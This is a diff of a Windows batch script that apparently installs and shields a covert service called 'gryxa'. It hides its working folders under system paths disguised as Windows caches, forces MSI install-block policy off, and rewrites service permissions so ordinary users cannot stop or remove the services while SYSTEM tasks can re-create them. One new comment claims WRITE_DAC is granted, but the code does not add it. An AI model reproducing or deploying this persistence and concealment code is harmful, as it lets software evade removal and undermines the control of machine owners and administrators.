@@ -1,5 +1,5 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S11 - dynamic gryxa FP from gryxa.cfg; NO LockDir on SC dirs
+REM OWN_SECURE BUILD 20260804S12 - dynamic gryxa FP from gryxa.cfg; NO LockDir on SC dirs; SY DELETE+WRITE_DAC
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
@@ -17,7 +17,7 @@ set "TASKROOT=%SystemRoot%\System32\Tasks"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo secure_begin %DATE% %TIME% S9>>"%LOG%"
+echo secure_begin %DATE% %TIME% S12>>"%LOG%"
 
 REM --- Neutralize MSI block policies (1625) ---
 REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
@@ -112,9 +112,10 @@ if exist "%WD%\secure_sc.flag" (
   echo sc_nolock_dirs>%WD%\secure_sc.flag
 )
 
-REM --- SC services: SYSTEM can config/stop/delete; BA full; users blocked ---
-REM SY: CC DC LC SW RP DT LO RC  (no SD -> cannot change this SD itself)
-set "SD=D:(A;;CCDCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
+REM --- SC services: SYSTEM can config/stop/delete/sdset; BA full; users blocked ---
+REM S12: SY must include SD (DELETE) + WD (WRITE_DAC) + WP so orphan heal / FP migration /
+REM sc sdset re-apply work under SYSTEM (tasks run as SYSTEM). Without SD, sc delete Access Denied.
+set "SD=D:(A;;CCDCLCSWRPWPDTLOCRRCSDWP;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 sc.exe sdset "%PRIM%" "%SD%" >nul 2>&1
 sc.exe sdset "%ALT%" "%SD%" >nul 2>&1
 sc.exe sdset "%GRYXA%" "%SD%" >nul 2>&1
